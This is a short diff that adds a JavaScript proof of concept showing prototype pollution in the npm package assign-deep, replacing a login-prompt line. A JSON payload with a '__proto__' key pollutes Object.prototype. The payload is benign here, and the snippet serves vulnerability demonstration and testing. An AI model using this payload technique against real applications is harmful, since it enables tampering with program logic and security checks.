@@ -1,1 +1,9 @@
-Not logged in · Please run /login
+```javascript
+const assign = require("./node_modules/assign-deep");
+
+const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+
+assign({}, payload);
+
+console.log(({}).polluted); // "yes" -- Object.prototype has been polluted
+```
